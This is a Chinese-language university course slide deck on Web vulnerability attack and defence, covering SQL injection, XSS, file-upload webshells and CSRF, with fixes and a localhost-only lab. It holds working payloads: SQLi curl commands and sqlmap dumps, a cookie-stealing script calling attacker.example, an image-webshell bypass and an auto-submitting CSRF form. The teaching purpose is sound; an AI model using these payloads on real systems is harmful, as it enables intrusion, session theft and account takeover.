@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="黄玮">
+  <title>第三单元: Web 漏洞攻防</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="../../../reveal.js/dist/reset.css">
+  <link rel="stylesheet" href="../../../reveal.js/dist/reveal.css">
+  <style>
+      </style>
+  <link rel="stylesheet" href="../../../reveal.js/dist/theme/white.css" id="theme">
+  <style>
+.reveal .iframe-wrapper { position: relative; width: 100%; }
+.reveal .iframe-wrapper iframe { display: block; max-width: none; max-height: none; }
+.reveal .iframe-newwindow-btn {
+  position: absolute; top: 8px; right: 12px;
+  background: rgba(0,0,0,0.65); color: #fff;
+  padding: 5px 12px; border-radius: 4px;
+  font-size: 13px; text-decoration: none;
+  opacity: 0.7; transition: opacity 0.2s;
+  z-index: 10;
+}
+.reveal .iframe-newwindow-btn:hover { opacity: 1; background: rgba(0,0,0,0.85); }
+  </style>
+  <link rel="stylesheet" href="../../../css/linux4ai.css"/>
+  <link rel="stylesheet" href="../../../reveal.js/dist/plugin/highlight/monokai.css">
+  <!-- Printing and PDF exports -->
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">第三单元: Web 漏洞攻防</h1>
+  <p class="subtitle">【道】【术】【器】【造器】—— SQLi · XSS · 上传 ·
+CSRF</p>
+  <p class="author">黄玮</p>
+  <p class="date">2026-秋</p>
+</section>
+
+<section>
+<section id="主题-0如何攻破一个-web-应用"
+class="title-slide slide level1">
+<h1>主题 0：如何攻破一个 Web 应用？</h1>
+
+</section>
+<section id="问题引入如何攻破一个-web-应用" class="slide level2">
+<h2>问题引入：如何攻破一个 Web 应用？</h2>
+<blockquote>
+<p><strong>「如何攻破一个 Web 应用？」</strong>——不是一道选择题，是
+综合实践项目（capstone）<strong>M3</strong> 的全部。</p>
+</blockquote>
+<ul>
+<li>上一单元（U2）你已「看清自己」：监听、扫描、指纹、暴露面清单</li>
+<li>这一单元开始「<strong>动手</strong>」：对你<strong>自己的靶场</strong>逐类拆解
+Web 漏洞</li>
+<li>Web 应用 =
+用户输入直达后端<strong>最危险的入口</strong>：表单、URL、上传、跨站请求</li>
+<li>攻防同一套原理：懂怎么进，才知道怎么堵——<strong>M3
+的概念验证（PoC）就是 M4 加固的弹药</strong></li>
+</ul>
+</section>
+<section id="攻击杀伤链速览第-6-章浓缩" class="slide level2">
+<h2>攻击杀伤链速览（第 6 章浓缩）</h2>
+<ul>
+<li><strong>侦察（U2）</strong> → <strong>扫描</strong> →
+<strong>枚举</strong> → <strong>获取访问</strong> →
+<strong>维持访问</strong> → <strong>掩盖痕迹</strong> →
+<strong>目标达成</strong></li>
+<li>本单元聚焦中段「<strong>获取访问 / 维持访问</strong>」：靠的是 Web
+层漏洞</li>
+<li>杀伤链是<strong>通用方法论</strong>；具体每一环用什么技术，由目标「指纹」（U2
+产出）决定</li>
+</ul>
+<blockquote>
+<p>杀伤链的每一步都对应一个「<strong>为什么</strong>」。本课件只补「做
+M3 所需」最小集，深度理论见
+<code>https://github.com/c4pr1c3/cuc-ns-ppt/blob/master/chap0x06.md</code>。</p>
+</blockquote>
+</section>
+<section id="本单元地图3-学时-30-slides-最大单元" class="slide level2">
+<h2>本单元地图（3 学时 · ~30 slides · 最大单元）</h2>
+<ol type="1">
+<li><strong>【道】</strong> 注入本质：数据即程序（元范式，呼应 U6）</li>
+<li><strong>【术】</strong> SQL 注入：原理 → 利用 → sqlmap →
+<strong>参数化修复</strong></li>
+<li><strong>【术】</strong> XSS：反射 / 存储 / DOM 三型 → 窃 cookie →
+编码防御</li>
+<li><strong>【术】</strong> 文件上传：RCE 原理 → 绕类型校验（图片马）→
+修复</li>
+<li><strong>【术】</strong> CSRF：自动带 cookie → 概念验证 →
+SameSite/Token</li>
+<li><strong>【器→造器】</strong> sqlmap / Burp / curl → 衔接实验 M3：≥4
+类概念验证 + 复现</li>
+</ol>
+</section>
+<section id="能力框架对应" class="slide level2">
+<h2>能力框架对应</h2>
+<ul>
+<li>簇 ③「<strong>攻击与渗透</strong>」· <strong>L2</strong>（U3
+的核心交付级）
+<ul>
+<li>L1：复述 SQLi/XSS/上传/CSRF 原理与危害（<strong>题库</strong>）</li>
+<li><strong>L2：发现并利用 ≥4 类 Web 漏洞，每类写概念验证 +
+复现（M3）</strong></li>
+<li>L3：编排多阶段攻击链 + 自动化利用框架（U4/M7 延伸）</li>
+</ul></li>
+<li>本单元实验 = 综合实践项目 <strong>M3</strong>（权重
+12%），证据就是你提交的 4 份概念验证</li>
+</ul>
+</section></section>
+<section>
+<section id="主题-1道注入的本质数据即程序"
+class="title-slide slide level1">
+<h1>主题 1：【道】注入的本质——数据即程序</h1>
+
+</section>
+<section id="注入的根因代码与数据混淆" class="slide level2">
+<h2>注入的根因：代码与数据混淆</h2>
+<blockquote>
+<p>一句话：<strong>当「数据」被解释器当成「代码」执行，注入就发生了。</strong></p>
+</blockquote>
+<ul>
+<li>解释型语言（SQL / Shell / HTML/JS /
+模板）都靠<strong>字符串拼接</strong>把数据送进解释器</li>
+<li>如果<strong>用户的输入</strong>未经隔离地进入拼接，用户就能「<strong>越权改写程序语义</strong>」</li>
+<li>这条根因一通百通：<strong>SQL 注入、命令注入、XSS、LDAP
+注入、模板注入……乃至 U6 的提示词注入，本质完全相同</strong></li>
+</ul>
+</section>
+<section id="漏洞-根因-后果链" class="slide level2">
+<h2>漏洞 = 根因 → 后果链</h2>
+<ul>
+<li><strong>根因</strong>：字符串拼接用户输入（无隔离、无转义、无类型约束）</li>
+<li><strong>触发条件</strong>：输入可达解释器、且解释器对「特殊字符」赋予了语义（<code>'</code>
+<code>;</code> <code>&lt;</code> <code>&amp;</code> 等）</li>
+<li><strong>利用</strong>：构造攻击载荷（payload）让解释器「<strong>改变原意</strong>」（闭合引号、追加语句、跳出数据上下文）</li>
+<li><strong>后果</strong>：信息泄露 / 篡改 / 越权 /
+RCE（取决于「逃逸后能干什么」）</li>
+</ul>
+<blockquote>
+<p>修任何一个注入类漏洞，都是把「<strong>数据</strong>」和「<strong>代码</strong>」重新隔开——具体手法各异（参数化、编码、白名单），但<strong>隔离</strong>这个元范式不变。</p>
+</blockquote>
+</section>
+<section id="元范式预告呼应-u6-提示词注入" class="slide level2">
+<h2>元范式预告：呼应 U6 提示词注入</h2>
+<ul>
+<li>LLM 把「<strong>自然语言</strong>」既当指令、又当数据 →
+提示词注入（Prompt Injection）</li>
+<li>与 SQL
+注入<strong>同构</strong>：用户输入「越权改写」了系统提示词的语义</li>
+<li><strong>道相同，器不同</strong>：U3 用参数化隔离 SQL；U6
+要研究如何隔离「指令」与「数据」——目前仍是开放难题</li>
+<li>记住这条元范式，U6 就不慌</li>
+</ul>
+</section></section>
+<section>
+<section id="主题-2术sql-注入" class="title-slide slide level1">
+<h1>主题 2：【术】SQL 注入</h1>
+
+</section>
+<section id="原理种子工程-ordersuser-的拼接" class="slide level2">
+<h2>原理：种子工程 <code>/orders?user=</code> 的拼接</h2>
+<pre ><code class="python"># capstone/seed/app.py:72 —— 故意预留的注入点
+user = request.args.get("user", session["user"])
+q = f"SELECT id, item FROM orders WHERE user = '{user}'"   # ⚠️ f-string 拼接
+rows = db().execute(q).fetchall()</code></pre>
+<ul>
+<li><code>user</code> 来自 URL
+参数，<strong>未做任何隔离</strong>就被插进 SQL 字符串</li>
+<li>正常：<code>/orders?user=alice</code> →
+<code>... WHERE user = 'alice'</code></li>
+<li>注入：<code>/orders?user=' OR '1'='1</code> →
+<code>... WHERE user = '' OR '1'='1'</code> →
+<strong>返回全表</strong></li>
+</ul>
+<blockquote>
+<p>端点还<strong>回显了查询语句本身</strong>（<code>"q": q</code>）——这让你能直观看到攻击载荷如何改变
+SQL 语义。</p>
+</blockquote>
+</section>
+<section id="利用一信息泄露-dump-全表" class="slide level2">
+<h2>利用一：信息泄露 / dump 全表</h2>
+<pre ><code class="bash"># ⚠️ 仅对自己 fork 的应用 / 127.0.0.1 使用
+# 用 UNION 把 sqlite_master（表结构）也带出来
+curl -b cookie.txt "http://127.0.0.1:5000/orders?user=' UNION SELECT sql,name FROM sqlite_master --"</code></pre>
+<ul>
+<li><code>'</code> 闭合原字符串；<code>--</code> 注释掉后续的
+<code>'</code></li>
+<li><code>UNION SELECT</code>
+把<strong>任意表</strong>拼进结果集——SQLite 的
+<code>sqlite_master</code>
+直接吐出<strong>建表语句与所有表名</strong></li>
+<li>后果：<strong>整个数据库的结构（乃至数据）被拖走</strong>——机密性（C）崩塌</li>
+</ul>
+</section>
+<section id="利用二篡改数据" class="slide level2">
+<h2>利用二：篡改数据</h2>
+<pre ><code class="bash"># 用 ; 追加一条 UPDATE，把 alice 的订单改掉
+curl -b cookie.txt "http://127.0.0.1:5000/orders?user='; UPDATE orders SET item='pwned' WHERE user='alice' --"</code></pre>
+<ul>
+<li>一条请求 = <strong>两条 SQL</strong>（<code>;</code>
+分隔），第二条执行<strong>任意写操作</strong></li>
+<li>后果：<strong>完整性（I）崩塌</strong>——订单、余额、权限表皆可被改</li>
+</ul>
+<blockquote>
+<p>注意：能否堆叠多语句（<code>stacked queries</code>）取决于驱动；SQLite
+<code>execute</code>
+默认不允许多语句，但<strong>很多生产数据库驱动允许</strong>——这是为什么
+SQLi 危害如此之大。</p>
+</blockquote>
+</section>
+<section id="利用三越权读他人订单认证绕过" class="slide level2">
+<h2>利用三：越权读他人订单（认证绕过）</h2>
+<pre ><code class="bash"># bob 越权读 alice 的订单（绕过 WHERE 限定）
+curl -b cookie.txt "http://127.0.0.1:5000/orders?user=alice' --"</code></pre>
+<ul>
+<li>应用本意「只返回<strong>当前登录用户</strong>的订单」，但
+<code>user</code> 参数可控 → 改成任意用户名</li>
+<li>等价于 <strong>IDOR + SQLi</strong> 组合：认证（你是 bob）≠
+授权（你只能看自己的）</li>
+<li>后果：<strong>水平越权</strong>——任何用户都能看任何人的数据</li>
+</ul>
+</section>
+<section id="工具化sqlmap用器" class="slide level2">
+<h2>工具化：sqlmap（用器）</h2>
+<pre ><code class="bash"># ⚠️ 仅对 127.0.0.1 / 自己 fork 的应用
+# 自动探测注入点、dump、甚至 os-shell
+sqlmap -u "http://127.0.0.1:5000/orders?user=alice" \
+       --cookie="session=..." \
+       --batch --dbs              # 列所有数据库
+sqlmap -u "http://127.0.0.1:5000/orders?user=alice" --dump --tables</code></pre>
+<ul>
+<li><strong>sqlmap</strong> = SQLi
+自动化瑞士军刀：探测类型（布尔/时间/UNION/报错）、dump、提权</li>
+<li>它把上面<strong>手工利用</strong>的套路全部脚本化——这就是「<strong>用器</strong>」</li>
+<li>但你<strong>必须先懂手工原理</strong>：否则看不懂 sqlmap
+的输出，也不会知道它有没有误报</li>
+</ul>
+</section>
+<section id="修复参数化查询隔离代码与数据" class="slide level2">
+<h2>修复：参数化查询（<strong>隔离代码与数据</strong>）</h2>
+<pre ><code class="python"># capstone/seed/app.py:93 —— M6 端点里的正确写法（M3 要你照搬到 /orders）
+db().execute("SELECT id, item FROM orders WHERE user = ?", (user,)).fetchall()
+#                                                              ^^^^
+#         ? 是占位符；user 作为【参数】传入，永远不会被当成 SQL 代码</code></pre>
+<ul>
+<li><strong>参数化</strong>（Prepared Statement）：<code>?</code>
+占位，数据经驱动<strong>单独绑定</strong>，解释器不解析其为代码</li>
+<li>一行改动，<strong>根除</strong>
+SQLi——这就是把「数据」和「代码」隔开的范式</li>
+<li>旁路（纵深防御）：输入校验、ORM、最小权限账号</li>
+</ul>
+<blockquote>
+<p>永远<strong>不要</strong>自己写转义函数——参数化是<strong>唯一</strong>可靠正解。</p>
+</blockquote>
+</section></section>
+<section>
+<section id="主题-3术xss跨站脚本" class="title-slide slide level1">
+<h1>主题 3：【术】XSS（跨站脚本）</h1>
+
+</section>
+<section id="原理把我的-js塞进你的页面" class="slide level2">
+<h2>原理：把「我的 JS」塞进「你的页面」</h2>
+<blockquote>
+<p>XSS =
+攻击者的脚本在<strong>受害者的浏览器</strong>里、以<strong>目标站点的身份</strong>执行。</p>
+</blockquote>
+<ul>
+<li>根因同 SQLi：<strong>用户输入被原样回显到 HTML，未编码</strong></li>
+<li>后果（在受害者浏览器视角）：
+<ul>
+<li>读 <code>document.cookie</code> /
+<code>localStorage</code>（<strong>窃会话</strong>）</li>
+<li>以受害者身份发请求（<strong>CSRF 的免密版</strong>）</li>
+<li>改页面、挂马、钓鱼（<strong>完整性 / 可用性</strong>）</li>
+</ul></li>
+</ul>
+</section>
+<section id="xss-三型反射-存储-dom" class="slide level2">
+<h2>XSS 三型：反射 / 存储 / DOM</h2>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 22%" />
+<col style="width: 22%" />
+<col style="width: 22%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: center;">型</th>
+<th style="text-align: left;">攻击载荷存在哪</th>
+<th style="text-align: left;">触发方式</th>
+<th style="text-align: left;">危害</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><strong>反射型</strong></td>
+<td style="text-align: left;">URL 参数 → 回显到页面</td>
+<td style="text-align: left;">诱受害者点链接</td>
+<td style="text-align: left;">中（需诱导）</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"><strong>存储型</strong></td>
+<td style="text-align: left;">写进数据库（评论/留言）</td>
+<td style="text-align: left;">任何人访问即触发</td>
+<td style="text-align: left;"><strong>高（持久）</strong></td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"><strong>DOM 型</strong></td>
+<td style="text-align: left;">不经过服务器，纯前端 JS 拼接</td>
+<td style="text-align: left;">前端 <code>innerHTML</code> 取 URL</td>
+<td style="text-align: left;">中（绕过 WAF）</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>反射型 = 「点链接才中招」；存储型 =
+「<strong>最危险</strong>，一个攻击载荷命中所有访问者」；DOM 型 =
+服务器看不出问题，纯前端缺陷。</p>
+</blockquote>
+</section>
+<section id="利用反射型-窃-cookie概念验证" class="slide level2">
+<h2>利用：反射型 + 窃 cookie（概念验证）</h2>
+<pre ><code class="bash"># ⚠️ 仅对自己 fork 的应用
+# 假设 /search?q= 直接回显查询词到页面
+curl "http://127.0.0.1:5000/search?q=&lt;script&gt;fetch('//attacker.example/?c='+document.cookie)&lt;/script&gt;"</code></pre>
+<pre ><code class="html">&lt;!-- 受害者点的链接（URL 编码后伪装）--&gt;
+https://your-app.example/search?q=%3Cscript%3E...%3C%2Fscript%3E</code></pre>
+<ul>
+<li>攻击载荷被服务器<strong>原样回显</strong>进 HTML → 浏览器当脚本执行
+→ cookie 外带到攻击者</li>
+<li>存储型同理，只是攻击载荷进了<strong>数据库</strong>，每个访问该页的人都中招</li>
+</ul>
+</section>
+<section id="修复输出编码-csp隔离代码与数据" class="slide level2">
+<h2>修复：输出编码 + CSP（<strong>隔离代码与数据</strong>）</h2>
+<ul>
+<li><strong>输出编码（首要）</strong>：把 <code>&lt;</code>
+<code>&gt;</code> <code>"</code> <code>'</code> <code>&amp;</code>
+转义成 HTML 实体（<code>&amp;lt;</code> …）→
+浏览器只当<strong>文字</strong>，不当脚本
+<ul>
+<li>模板引擎默认做（Jinja2 的 <code>{{ x }}</code>
+自动转义）；<strong>别用 <code>|safe</code>
+除非确信输入可信</strong></li>
+</ul></li>
+<li><strong>输入校验（次要）</strong>：白名单允许的字符集，不是黑名单</li>
+<li><strong>CSP（纵深）</strong>：<code>Content-Security-Policy</code>
+限制脚本来源，即使 XSS 成功也加载不出外部 JS</li>
+</ul>
+<blockquote>
+<p>同 SQLi：本质都是「<strong>别把数据当代码</strong>」。编码 = HTML
+层的「参数化」。</p>
+</blockquote>
+</section></section>
+<section>
+<section id="主题-4术文件上传漏洞" class="title-slide slide level1">
+<h1>主题 4：【术】文件上传漏洞</h1>
+
+</section>
+<section id="原理上传一个能被执行的文件" class="slide level2">
+<h2>原理：上传一个「能被执行」的文件</h2>
+<blockquote>
+<p>文件上传本身不是漏洞；<strong>上传的文件被服务器当脚本执行</strong>才是。</p>
+</blockquote>
+<ul>
+<li>应用允许用户上传（头像、附件），但<strong>未限制类型 / 存到 Web
+可达目录 / 用原名</strong></li>
+<li>攻击者上传 <code>.php</code> / <code>.jsp</code> /
+<code>.html</code> / 图片马 → 访问其 URL → <strong>以 Web
+进程权限执行任意代码（RCE）</strong></li>
+<li>后果：<strong>直接拿
+shell</strong>——三性全崩（C/I/A），且常是<strong>进入内网的跳板</strong></li>
+</ul>
+</section>
+<section id="利用绕类型校验图片马-多重后缀" class="slide level2">
+<h2>利用：绕类型校验（图片马 / 多重后缀）</h2>
+<pre ><code class="bash"># ⚠️ 仅对自己 fork 的应用
+# 1) 服务端只看 Content-Type？改头：
+curl -F "file=@shell.php;type=image/jpeg" http://127.0.0.1:5000/upload
+
+# 2) 服务端只看扩展名？图片马：真图片头 + PHP 体
+echo -n -e '\xFF\xD8\xFF\xE0' &gt; evil.jpg   # JPEG 魔数
+cat shell.php &gt;&gt; evil.jpg                   # 追加 PHP 代码
+# 若服务器对 .jpg 用 PHP 解析（错配），访问即执行</code></pre>
+<ul>
+<li>校验必须<strong>多维</strong>：扩展名、Content-Type、文件头（魔数）、内容解析——任何一维单点都可绕</li>
+<li>经典绕法：<code>shell.php.jpg</code>（Apache
+多重后缀）、<code>.htaccess</code> 改解析规则、大小写/空格绕黑名单</li>
+</ul>
+</section>
+<section id="修复隔离存储-禁止执行隔离代码与数据" class="slide level2">
+<h2>修复：隔离存储 + 禁止执行（<strong>隔离代码与数据</strong>）</h2>
+<ul>
+<li><strong>重命名</strong>：上传后用<strong>随机文件名</strong>（UUID）存，丢掉用户给的扩展名</li>
+<li><strong>隔离目录</strong>：存到<strong>非 Web
+根</strong>或<strong>静态资源域</strong>，且<strong>禁用该目录脚本解析</strong>（<code>php_flag engine off</code>）</li>
+<li><strong>白名单校验</strong>：扩展名 + Content-Type +
+魔数三重一致才接受</li>
+<li><strong>大小限制 + 病毒扫描</strong>：纵深防御</li>
+</ul>
+<blockquote>
+<p>又是「隔离」：把上传内容当<strong>纯数据</strong>对待，绝不给它「变成代码」的机会。</p>
+</blockquote>
+</section></section>
+<section>
+<section id="主题-5术csrf跨站请求伪造" class="title-slide slide level1">
+<h1>主题 5：【术】CSRF（跨站请求伪造）</h1>
+
+</section>
+<section id="原理浏览器自动带-cookie被滥用" class="slide level2">
+<h2>原理：浏览器「自动带 cookie」被滥用</h2>
+<blockquote>
+<p>CSRF =
+攻击者<strong>诱导已登录受害者</strong>，让其浏览器<strong>带着
+cookie</strong>发出非本意的请求。</p>
+</blockquote>
+<ul>
+<li>浏览器规则：请求目标域时<strong>自动附带该域的
+cookie</strong>（包括会话 cookie）</li>
+<li>攻击者在 <code>evil.com</code> 放一个表单/图片，action 指向
+<code>your-app.com/change_password</code></li>
+<li>受害者（已登录 your-app）一访问 evil.com → 浏览器<strong>背着 cookie
+发了改密请求</strong></li>
+<li>后果：<strong>以受害者身份执行状态变更</strong>（改密、下单、转账）——<strong>完整性（I）</strong>崩塌</li>
+</ul>
+</section>
+<section id="概念验证诱导改密-下单" class="slide level2">
+<h2>概念验证：诱导改密 / 下单</h2>
+<pre ><code class="html">&lt;!-- evil.com 上的陷阱页：受害者一打开就自动 POST 改密 --&gt;
+&lt;form action="http://your-app.example/change_password" method="POST" id="f"&gt;
+  &lt;input name="new_password" value="hacked"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></pre>
+<ul>
+<li>与 XSS 的区别：CSRF
+<strong>不在目标站注入脚本</strong>，而是借浏览器<strong>自动带
+cookie</strong>的机制「冒名」发请求</li>
+<li>因此 CSRF 只对<strong>状态变更</strong>（POST/PUT/DELETE）有效；纯
+GET 读数据危害有限</li>
+</ul>
+</section>
+<section id="修复samesite-token隔离来源" class="slide level2">
+<h2>修复：SameSite + Token（<strong>隔离来源</strong>）</h2>
+<ul>
+<li><strong>SameSite
+cookie（首选，零改造成本）</strong>：<code>Set-Cookie: session=...; SameSite=Lax</code>
+→ 跨站请求<strong>不带 cookie</strong></li>
+<li><strong>CSRF Token</strong>：服务器下发一次性随机
+token，表单必须回带；跨站页拿不到 token → 请求被拒</li>
+<li><strong>校验 Origin/Referer</strong>：只接受来自本站的请求</li>
+<li><strong>不要用 GET 改状态</strong>：所有写操作走 POST +
+二次确认</li>
+</ul>
+<blockquote>
+<p>CSRF
+的元范式不是「隔离代码与数据」，而是「<strong>隔离请求来源</strong>」——验证「这请求真的是你主动发的吗」。</p>
+</blockquote>
+</section></section>
+<section>
+<section id="主题-6器工具谱系用器-造器"
+class="title-slide slide level1">
+<h1>主题 6：【器】工具谱系（用器 → 造器）</h1>
+
+</section>
+<section id="攻击侧工具sqlmap-burp-curl" class="slide level2">
+<h2>攻击侧工具：sqlmap / Burp / curl</h2>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">工具</th>
+<th style="text-align: left;">擅长</th>
+<th style="text-align: center;">用器层级</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><strong>curl</strong></td>
+<td style="text-align: left;">手工构造任意请求（最快验证攻击载荷）</td>
+<td style="text-align: center;">L1/L2（基本功）</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"><strong>sqlmap</strong></td>
+<td style="text-align: left;">SQLi 自动化（探测/dump/os-shell）</td>
+<td style="text-align: center;">L2（用器）</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"><strong>Burp Suite / Yakit</strong></td>
+<td style="text-align: left;">全站抓包、改包、重放、扫描</td>
+<td style="text-align: center;">L2（用器）</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"><strong>浏览器 DevTools</strong></td>
+<td style="text-align: left;">XSS/CSRF 调试、看 cookie/CSP</td>
+<td style="text-align: center;">L2（用器）</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Yakit 是国产安全测试平台（<a
+href="https://yaklang.io">yaklang.io</a>），功能对标
+Burp，<strong>课程国产优先推荐</strong>。</p>
+</blockquote>
+</section>
+<section id="从用器到造器l2-l3" class="slide level2">
+<h2>从「用器」到「造器」（L2 → L3）</h2>
+<ul>
+<li><strong>用器</strong>（M3 要求）：会用 sqlmap/Burp
+<strong>复现</strong> ≥4 类漏洞、读懂输出、写概念验证</li>
+<li><strong>造器</strong>（L3，U4/M7 延伸）：
+<ul>
+<li>把攻击载荷编排成<strong>多阶段攻击链</strong>（如 SQLi dump →
+拿管理员 hash → 越权 → 植入存储型 XSS → 持久化）</li>
+<li>写<strong>自动化利用脚本</strong>（调用 sqlmap <code>-oX</code> 产物
++ 自定义攻击载荷字典）</li>
+<li>乃至造一个<strong>迷你
+WAF</strong>（U4）来挡住自己的概念验证——攻防一体</li>
+</ul></li>
+</ul>
+<blockquote>
+<p>M3
+只要求到「用器」。但请你<strong>带着「造器」的意识</strong>去用：每个攻击载荷都问一句「这能脚本化吗、能串起来吗」。</p>
+</blockquote>
+</section></section>
+<section>
+<section id="主题-7造器衔接实验-m3" class="title-slide slide level1">
+<h1>主题 7：【造器】衔接实验 M3</h1>
+
+</section>
+<section id="实验-m34-类概念验证-复现步骤" class="slide level2">
+<h2>实验 M3：≥4 类概念验证 + 复现步骤</h2>
+<pre ><code >docs/m3/
+├── sqli-poc.*       # 任务 A：/orders?user= 注入，dump/篡改/越权
+├── xss-poc.*        # 任务 B：反射/存储，窃 cookie
+├── upload-poc.*     # 任务 C：图片马/绕类型校验
+├── csrf-poc.*       # 任务 D：跨站改密/下单
+└── report.md        # 每类：原理 + 触发条件 + 影响 + 复现 + 自评</code></pre>
+<ul>
+<li>从 <code>milestone/m2</code> 切 <code>milestone/m3</code>，MR 目标 =
+<code>milestone/m2</code>（<a
+href="../../unit00-intro/labs/git-guide.html">Git 指南</a>）</li>
+<li>每类概念验证必含<strong>三段</strong>：<strong>原理</strong>（为什么能打）+
+<strong>触发条件</strong>（什么环境能打）+
+<strong>影响</strong>（打了能干嘛）</li>
+</ul>
+<blockquote>
+<p>详见 <a
+href="../labs/lab03-web-offense.html"><code>labs/lab03-web-offense.md</code></a>。</p>
+</blockquote>
+</section>
+<section id="ai-辅助渗透任务-e-可选-对比不替代" class="slide level2">
+<h2>AI 辅助渗透（任务 E · 可选 · 对比不替代）</h2>
+<ul>
+<li>用 <strong>PentestGPT</strong>
+或<strong>国产安全大模型</strong>跑一遍 M3 靶场</li>
+<li>与人工对比：<strong>命中数 / 误报数 /
+耗时</strong>——给数字，不给空话</li>
+<li>⚠️ <strong>不替代人工概念验证</strong>，仅作对比；用 AI 须注明范围 +
+人工复核；<strong>禁止国外大模型</strong></li>
+<li>这是 U6「AI 赋能安全」的提前埋伏——M3
+给你一个<strong>真实基准</strong>去衡量 AI 渗透</li>
+</ul>
+</section>
+<section id="复现步骤的写法自检" class="slide level2">
+<h2>复现步骤的写法（自检）</h2>
+<pre ><code class="bash"># 1) 起 M3 末的靶场（127.0.0.1:5000）
+flask --app app run --port 5000
+# 2) 登录拿 cookie（你的应用，你的账号）
+curl -c cookie.txt -d "user=alice&pass=..." http://127.0.0.1:5000/login
+# 3) 打 SQLi（仅 127.0.0.1）
+curl -b cookie.txt "http://127.0.0.1:5000/orders?user=' UNION SELECT sql,name FROM sqlite_master --"
+# 4) 预期：回显里能看到 orders 表结构 + 其他表名</code></pre>
+<ul>
+<li>复现脚本里<strong>所有目标地址只能是
+<code>127.0.0.1</code></strong>——这是 AI 助教的硬核验项</li>
+<li>自检关键词覆盖：<code>git grep -hoiE 'sql[iI]?|XSS|文件?上传|upload|CSRF' milestone/m3 -- '*.md' | sort -u | wc -l</code>
+≥ 4</li>
+</ul>
+</section></section>
+<section>
+<section id="主题-8收尾" class="title-slide slide level1">
+<h1>主题 8：收尾</h1>
+
+</section>
+<section id="能力自评本单元点亮簇-③攻击与渗透" class="slide level2">
+<h2>能力自评：本单元点亮簇 ③「攻击与渗透」</h2>
+<table>
+<colgroup>
+<col style="width: 37%" />
+<col style="width: 25%" />
+<col style="width: 37%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: center;">级</th>
+<th style="text-align: left;">能力描述</th>
+<th style="text-align: center;">自评勾选</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">L1</td>
+<td style="text-align: left;">复述 SQLi/XSS/上传/CSRF 原理与危害</td>
+<td style="text-align: center;">☐ 题库达标</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"><strong>L2</strong></td>
+<td style="text-align: left;"><strong>发现并利用 ≥4 类 Web
+漏洞，每类写概念验证 + 复现</strong></td>
+<td style="text-align: center;">☐ <strong>M3 交付</strong></td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">L3</td>
+<td style="text-align: left;">编排多阶段攻击链 + 自动化利用框架</td>
+<td style="text-align: center;">☐ U4/M7 延伸</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="红线仅-127.0.0.1-自己派生的应用攻击侧单元硬性红线"
+class="slide level2">
+<h2>⚠️ 红线：仅 127.0.0.1 /
+自己派生的应用（<strong>攻击侧单元，硬性红线</strong>）</h2>
+<ul>
+<li>所有概念验证、所有攻击载荷 <strong>仅指向 <code>127.0.0.1</code>
+或你自己派生的靶场</strong></li>
+<li><strong>禁止</strong>对任何真实 /
+第三方系统做未授权测试——即便「只是看看」也是红线</li>
+<li>报告须<strong>显式声明授权范围</strong>；触及第三方 =
+安全严谨维度<strong>直接不合格</strong> + 上报</li>
+<li>课程<strong>不教授</strong>编写恶意代码；这些工具同时是<strong>防御自查</strong>手段</li>
+</ul>
+</section>
+<section id="小结今天带走的三件事" class="slide level2">
+<h2>小结：今天带走的三件事</h2>
+<ol type="1">
+<li><strong>【道】</strong> 注入本质 =
+数据被当代码执行；<strong>隔离</strong>是统一解药（SQLi/XSS/上传
+通用，并预告 U6 提示词注入）</li>
+<li><strong>【术】</strong> 四类 Web 漏洞各有「根因 → 利用 →
+修复」三段：SQLi 参数化、XSS 编码、上传禁执行、CSRF 隔离来源</li>
+<li><strong>【造器】</strong> 实验 M3 要你交 ≥4 类概念验证 +
+复现步骤，<strong>仅打 127.0.0.1</strong>——这些概念验证就是 M4
+加固的弹药</li>
+</ol>
+<blockquote>
+<p>深度理论：<code>https://github.com/c4pr1c3/cuc-ns-ppt/blob/master/chap0x06.md</code>（方法论/杀伤链）、<code>https://github.com/c4pr1c3/cuc-ns-ppt/blob/master/chap0x07.md</code>（Web
+漏洞全谱，按需自学）。</p>
+</blockquote>
+</section>
+<section id="下一单元-u4防御与加固" class="slide level2">
+<h2>下一单元 U4：防御与加固</h2>
+<ul>
+<li>M3 你把应用「打穿」了；U4/M4 给它套上<strong>纵深防御</strong>：WAF
+/ IDS / 最小权限 / 安全配置</li>
+<li><strong>M3 的概念验证 = M4
+规则的命中样本</strong>：没有攻击侧证据，WAF
+规则就是盲盒（命中谁、误报谁，全靠你造的弹药验证）</li>
+<li>然后是 U5（检测/取证/蜜罐）、<strong>U6（AI×网络安全，核心
+30%）</strong>——回到本单元埋下的「提示词注入」元范式</li>
+</ul>
+</section></section>
+    </div>
+  </div>
+
+  <script src="../../../reveal.js/dist/reveal.js"></script>
+  <script src="../../../reveal.js/dist/plugin/highlight.js"></script>
+  <script src="../../../reveal.js/dist/plugin/notes.js"></script>
+  <script src="../../../reveal.js/dist/plugin/zoom.js"></script>
+  <script src="../../../reveal.js/dist/plugin/math.js"></script>
+
